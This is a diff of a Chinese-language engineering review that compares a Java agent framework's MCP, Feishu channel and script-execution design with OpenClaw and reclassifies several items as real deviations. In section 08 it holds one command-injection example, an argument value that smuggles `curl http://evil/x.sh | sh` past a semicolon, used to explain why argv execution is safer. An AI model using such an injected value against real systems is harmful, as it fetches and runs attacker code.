@@ -10,11 +10,12 @@
 - 一句：多来源汇成一份清单的口径一致；P09 之后模型默认只经 `ToolSearch` 检索，票面说的"模型可见清单"已收窄成 catalog，这是后续票的演进，不是来源互相挤掉。
 
 ### 02 MCP 跨进程闭环
-- 判定：故意不同
-- 代码证据：`McpToolProvider.java:48-55`（建 provider 时 `listTools()` 为空直接抛，启动即失败）；`McpConnection.java:149,162,201`（只认 `McpTransportSessionNotFoundException`，关旧连接重开一次并重放）
+- 判定：不一致（真偏差，不是"故意不同"）
+- 我们：`McpToolProvider.java:48-55`（建 bean 时 `listTools()` 为空直接抛，应用起不来）；`McpConnection.java:149,162,201`（只在调用中认 `McpTransportSessionNotFoundException`，关旧连接重开一次并重放）
 - 代码证据：`ProcessStdioMcpEndpoint.java:145`（今天已有真实子进程 stdio 端点，票面 Answer 里"OS 进程那条边界没有真起"已不成立）
-- OpenClaw：`docs/tools/mcp.md:61`（启动失败按 30 秒→10 分钟指数退避后台重试，"turns never wait for retries"）；`docs/tools/mcp.md:45`（连不上时保留上次成功列出的工具）
-- 一句：同为 MCP 客户端且工具都过预算/权限，但故障策略相反；票面写的理由是"不等到调用时才暴露配置错误"（ADR-0002/0008），故记故意不同。
+- OpenClaw：`docs/tools/mcp.md:61` 原文——"When OpenClaw's built-in MCP client cannot start a server, it retries with exponential backoff: 30 seconds, doubling up to 10 minutes. … After a startup failure, turns never wait for retries: recovery runs in the background, and recovered tools become available at the next turn boundary."；`docs/tools/mcp.md:44-45`——"keeps its last successfully listed tools and utilities in the session's model-facing catalog while recovery runs in the background"
+- 例子：第三方 server 升级重启 40 秒。它的做法：这一轮照常答，只是那家的工具暂时看不见，40 秒后下一轮自动回来，说明里挂一条"该 server 不可用"。我们的做法：应用**起不来**；在 K8s 上表现为 CrashLoopBackOff，重试由编排层做，日志里只有一行 MCP 连接失败——而 HTTP 通道也被一起带下线。
+- 对齐要改什么（成本：中偏大）：`AgentAutoConfiguration#collectToolCallbacks` 是启动时把 `ToolCallbackProvider` 收成一份快照，`ChatClient` 也是单例；要让"恢复后的工具在下一轮生效"，得把工具清单改成按轮解析 + 一个后台重试与"不可用"占位的注册表。不是补一个 catch 能完事的。
 
 ### 03 Script Package 受限执行
 - 判定：自研
@@ -53,11 +54,12 @@
 - 一句：三层示例与实录还在，但票面用来钉住"三层共用预算/鉴权"的两条测试今天不存在，"复核覆盖三层"这一条承诺没有回归守着。
 
 ### 08 脚本层改成结构化 argv
-- 判定：故意不同
+- 判定：自研（OpenClaw 没有"声明式脚本包"这个形态，用例子说明为什么不能照抄它的 `exec`）
 - 代码证据：`ProcessRequest.java:27`（`record ProcessRequest(List<String> argv, long timeoutMillis)`，没有 command 字符串、也没有 env 入口）；`LocalProcessRunner.java:59`（`new ProcessBuilder(request.argv())`，数组直接交给进程）
 - 代码证据：`ScriptStaticCheck.java:41,184-185`（`NO_SHEBANG` 挡在落盘之前）；`BuildContractTest.java:84-89`（红线收窄到 `LocalProcessRunner` 一个类，而不是删掉）
-- OpenClaw：`docs/tools/exec.md:54-55`（`exec` 的参数是 `command` 字符串，"Shell command to run"）
-- 一句：OpenClaw 仍把命令交给 shell，本项目改成 argv 直执；票面的理由是"入口脚本与参数以 argv 数组交给进程，谁都不解释它们"，故记故意不同。
+- OpenClaw：`docs/tools/exec.md:54-55`（`exec` 的 `command` 是 "Shell command to run"）——但那是**通用 shell 工具**：模型直接写一条命令，沙箱、审批、IO 配额都在那一层。我们没有这个能力（ADR-0002 明确不做），我们的东西是"预先声明的脚本 + 声明过的参数"。
+- 例子：脚本包 `report.sh` 收一个 `--region` 参数，值由模型给。走 shell 时，模型写 `east; curl http://evil/x.sh | sh`，分号后面那段会被执行；argv 直执时它只是 `--region` 的一个取值，脚本自己的参数校验会拒掉。**同一句模型输出，一条路是数据，另一条路是命令。** 这就是为什么这条不能"照 OpenClaw 那样收字符串"——它那边的字符串本来就该被解释，我们这边的参数是业务数据。
+- 一句：形态不同（通用 shell vs 声明式脚本包），不是"我们选了个更严的写法"；`argv` 是这条形态的必然结果，不是偏好。
 
 ## m2-real-model-testing
 
@@ -93,41 +95,53 @@
 - 一句：都是"只有换一家可能好才降级"，确定性错误不扩散；口径一致。
 
 ### 04 飞书入站调度：去重 → 立刻 ACK → 异步执行 → 回推
-- 判定：故意不同
-- 代码证据：`claw4j-core/src/main/java/io/github/claw4j/channel/kernel/InboundDispatcher.java:202-232`（`accept` 只去重、认人、投 executor，返回即 ACK）；`:212`（同 `eventId` 只 ACK 不执行）；`:285`（超长按段落切分顺序发）
+- 判定：不一致（真偏差，不是"故意不同"）
+- 我们：`claw4j-core/src/main/java/io/github/claw4j/channel/kernel/InboundDispatcher.java:202-232`（`accept` 只去重、认人、投 executor，返回即 ACK）；`:212`（同 `eventId` 只 ACK 不执行）；去重表是**进程内 TTL**，不落库
 - 代码证据：`InboundDispatchTest.java:76-164`（ACK 早于 Agent；重复投递只跑一次；过窗重跑）
-- OpenClaw：`docs/channels/feishu/setup.md:43`（入站事件先持久化入队，按 event ID 抑制重复，重启后仍可恢复）
-- 一句：ACK/去重/异步/回推骨架一致，但我们用进程内 TTL 去重而不是持久队列；票面写明"不引 Redis，单实例是既定形态"，故记故意不同。落点也已从 `channel.feishu` 移到 `claw4j-core` 的 `channel.kernel`。
+- OpenClaw：`docs/channels/feishu/setup.md:43`——"durably queues authenticated `im.message.receive_v1` … envelopes **before** agent dispatch … Pending or retryable events survive a Gateway restart … use Feishu's event ID to suppress duplicate queue entries"；`:45`——"If a WebSocket event cannot be persisted after bounded retries, OpenClaw closes that socket … instead of continuing past an uncommitted turn."
+- 例子：发版窗口内进程重启。飞书已经收到我们的 ACK、不会重投；那条消息只在内存里，随进程消失——**用户的消息永久丢失**，日志里只留下"已提交到执行线程池"。同样这一秒，OpenClaw 的部署把它留在队列里，重启后接着跑完。差别不是"去重表放哪儿"，是"这条消息是不是已经没人负责了"。
+- 对齐要改什么（成本：大）：一张持久表（`event_id` 唯一 + 状态 + 每对话一个序号），改成"先落库再 ACK、执行完标完成、启动时扫未完成并按对话串行"。落不了库要像它那样断开连接、不越过未提交的一轮。
+- 一句：ACK/去重/异步/回推的骨架一致，但**持久性没有**——今天这套在崩溃时丢消息，而这一条正是票面"不引 Redis，单实例是既定形态"顺手带过去的。
 
 ### 05 飞书长连接接上真 SDK，关掉 M2
-- 判定：故意不同
-- 代码证据：`FeishuLongConnectionChannel.java:113-121`（`start()` + `awaitReady`，超时/异常直接抛）；`FeishuChannelAutoConfiguration.java:44-46,67-68`（SDK 在 classpath、凭据齐、`enabled` 才装配）
+- 判定：不一致（真偏差；但"凭据错就失败"这一半与 OpenClaw 一致）
+- 我们：`FeishuLongConnectionChannel.java:113-121`（`start()` + `awaitReady`，**超时或异常一律直接抛**，应用起不来）；`FeishuChannelAutoConfiguration.java:44-46,67-68`（SDK 在 classpath、凭据齐、`enabled` 才装配）
 - 代码证据：`FeishuChannelWiringTest.java:57-90`（缺凭据/半配/SDK 不在 classpath/`enabled=false` 四种退让）
-- OpenClaw：`docs/channels/feishu.md:11`（WebSocket 是默认事件传输，无需公网 URL）；`docs/channels/feishu/setup.md:43`（入站持久化）
-- 一句：同为 SDK 长连接，但"连不上就启动失败"与 OpenClaw 的降级/状态上报相反；票面理由是"带着半死的通道跑比起不来更难排查"，故记故意不同。
+- OpenClaw：`docs/channels/slack/transports.md:71`——"Recoverable start, start-wait, and disconnect failures **retry until the channel stops**. Permanent account and credential errors such as invalid auth, revoked tokens, or missing scopes **fail fast** instead of retrying forever."（飞书的通道页没有写"连不上就起不来"，只写状态探测 `channels status --probe`）
+- 例子：App ID 写错（永久错误）→ 不该无限重试、要立刻把错误报出来，这条我们和它一致。换成对端暂时不可用（飞书侧限流、本机 DNS 抖动、长连接建到一半超时）→ 我们**同样**整个进程退出：K8s 上是 CrashLoopBackOff，**连 HTTP 通道也一并不可用**；OpenClaw 起得来，只是这一路未连接，`channels status --probe` 报状态，别的通道照常收消息。
+- 对齐要改什么（成本：小偏中）：把"抛"拆成两类——凭据/配置类（永久）继续抛；连接超时、握手失败、后续断开走后台退避重连 + 状态上报。`start()` 的 `try/catch` 已经在那里，是把 catch 里的 `throw` 换成一个可重试的状态机，不需要动装配条件。
+- 一句：**"永远不降级"和"一律失败"不是一回事**；OpenClaw 分的是"不可恢复"与"可恢复"，我们现在把两类都判成了不可恢复。
 
 ### 06 文档与限制记账对齐
-- 判定：不一致
-- 代码证据：`docs/adr/0010-module-layering-and-dependency-direction.md:49`（仍写 `DomainBoundaryTest`，而全仓现在叫 `CoreBoundariesTest`）
+- 判定：一致（评审当天记的偏差已在 `a6c8fda` 修掉）
+- 代码证据：`docs/adr/0010-module-layering-and-dependency-direction.md:49`（现在是 `CoreBoundariesTest`）、`docs/adr/0015-one-core-artifact.md:70-71`（两个都叫 `CoreBoundariesTest` / `CoreBoundaryTest`，与代码里一致）
 - 代码证据：`docs/adr/0009-channel-selection-feishu-long-connection.md:45-53`（实现记录在）；`docs/agents/guardrails.md:37`（SDK 无单测的偏差在）；`README.md:367`（FEISHU 配置行在）
 - OpenClaw：无对应物（内部 ADR/文档记账）
-- 一句：五条验收里四条还在，唯独"ADR-0010 类名与现存类一致"被后续 ADR-0015 的重构打破，票面承诺今天不成立。
+- 一句：五条验收今天全在——第 5 条当时被 ADR-0015 的重构打破（ADR-0010 还指向 `DomainBoundaryTest`），已随死指针清理一起修正。
 
 ### 07 文档不该点测试类名，只该说"这条要有测试守着"
-- 判定：不一致
-- 代码证据：`docs/capability-tests.md:106`（`ApprovalFlowTest` 等类名）、`docs/adr/0015-one-core-artifact.md:70-71`（`DomainBoundaryTest` / `CoreBoundaryTest`）、`docs/adr/0010-module-layering-and-dependency-direction.md:49`（`DomainBoundaryTest`）
-- 复扫证据：`docs/` + README + GLOSSARY 里 `*Test` / `*IT` 记号 39 处（不含 CONTRIBUTING 的 3 处），票面要的"0 处"今天不存在。
+- 判定：不一致（死指针已清零，但类名仍大量存在）
+- 代码证据：`docs/capability-tests.md:106`（`ApprovalFlowTest` / `ApprovalControllerTest` 这类写法仍在，17 处）
+- 复扫证据（2026-11-08，排除 `docs/adr/` 与两份评审报告这类"记录"）：`docs/` + `README.md` + `GLOSSARY.md` 里 `*Test` / `*IT` 记号 **28 处**，最大头是 `docs/capability-tests.md`（17）。票面要的"0 处"今天不存在。
 - OpenClaw：无对应物（文档卫生是本项目内部约束）
-- 一句：当时把类名清零，后续文档（`capability-tests.md`、ADR-0015 等）又写回类名，且其中 `DomainBoundaryTest` 已不存在——"由某测试守着"重新变成死指针。
+- 一句：`DomainBoundaryTest` 这个**死指针**已经没了（`a6c8fda`），但"文档只描述要有什么测试、不点类名"这条承诺今天仍不成立——改一个类名就多一处过期指针，这次的 `DomainBoundaryTest` 就是这么来的。
 
 ## 本批小结
-- 一致 4：01（多来源工具收集）、04（技能渐进披露）、05（子代理隔离与白名单）、closeout-03（降级分类）。
-- 自研 4：03（脚本包沙箱）、06（技能生成五步链）、closeout-01（front matter 白名单解析）、closeout-02（SQL 行上限包装）。
-- 故意不同 4：02（MCP 启动即 fail-fast vs 后台退避重试）、08（argv 直执 vs shell 解释）、closeout-04（进程内 TTL 去重 vs 持久队列）、closeout-05（连不上即启动失败 vs 降级）。
-- 不一致 3：capability-07（`BudgetAcrossLayersTest` / `PermissionsAcrossLayersTest` 不存在，"三层共用预算/鉴权"没有回归守着）、closeout-06（ADR-0010 仍指向已不存在的 `DomainBoundaryTest`）、closeout-07（docs 里 39 处测试类名复活，含死指针）。
-- 已过期 1：real-model-01（真模型回归基线被推翻，门禁改回假模型且无 CI）。
+- 一致 5：01（多来源工具收集）、04（技能渐进披露）、05（子代理隔离与白名单）、closeout-03（降级分类）、closeout-06（ADR 指针，评审当天记的偏差已修）。
+- 自研 5：03（脚本包沙箱）、06（技能生成五步链）、08（argv 直执，无对应形态）、closeout-01（front matter 白名单解析）、closeout-02（SQL 行上限包装）。
+- **故意不同 0**：这一档不再用来装"和 OpenClaw 不一样、但我们有理由"的东西。和它不一样就是偏差（不一致），
+  它没有这个东西就是自研——那要用例子说清，不能反过来拿"我们有理由"当结论。
+- 不一致 5：
+  - **capability-02**（MCP）：启动即失败 vs 后台退避重试 30 秒→10 分钟 + 保留上次成功列出的工具
+  - **closeout-04**（入站）：进程内 TTL 去重 + 先 ACK vs 持久队列 + 先落库
+  - **closeout-05**（通道连接）：一律抛 vs 只有永久错误才失败、可恢复的后台重连
+  - capability-07（`BudgetAcrossLayersTest` / `PermissionsAcrossLayersTest` 不存在，"三层共用预算/鉴权"没有回归守着）
+  - closeout-07（docs 里仍有 28 处测试类名；死指针已清零）
+- 已过期 1：real-model-01（真模型回归基线被推翻，门禁改回替身且无 CI）。
 
-- 最值得修的三处（按代价排序）：
-  1. 文档指针（最便宜）：先把 ADR-0010 的 `DomainBoundaryTest` 改成 `CoreBoundariesTest`，再决定 docs 是否真要维持"0 类名"（今天 39 处）。
-  2. 补回跨层回归（中等）：capability-07 承诺的 `BudgetAcrossLayersTest` / `PermissionsAcrossLayersTest` 已无，"三层共用同一份预算与鉴权"今天没有测试守着。
-  3. 真模型回归的账（最贵）：real-model-01 的基线已被推翻，`README.md:412` 与 ADR-0011 现在互相矛盾；要么恢复一条最小真模型门禁，要么改 ADR-0011 并写清哪些用例必须真模型。
+- 按代价排序的下一步
+  1. **closeout-05（最小）**：把"抛"拆成两类——凭据/配置类继续失败，连接超时与断开走后台退避重连 + 状态上报。
+     `start()` 的 `try/catch` 已经在那儿，换的是 catch 里的动作，不动装配条件。
+  2. **capability-02（中偏大）**：工具清单从启动快照改成按轮解析，加一个后台重试与"不可用"占位的注册表。
+  3. **closeout-04（最大）**：入站持久表 + 先落库再 ACK + 启动扫未完成 + 按对话串行。
+  4. 文档指针（最便宜，可随手）：docs 正文里 28 处测试类名（`capability-tests.md` 占 17）。
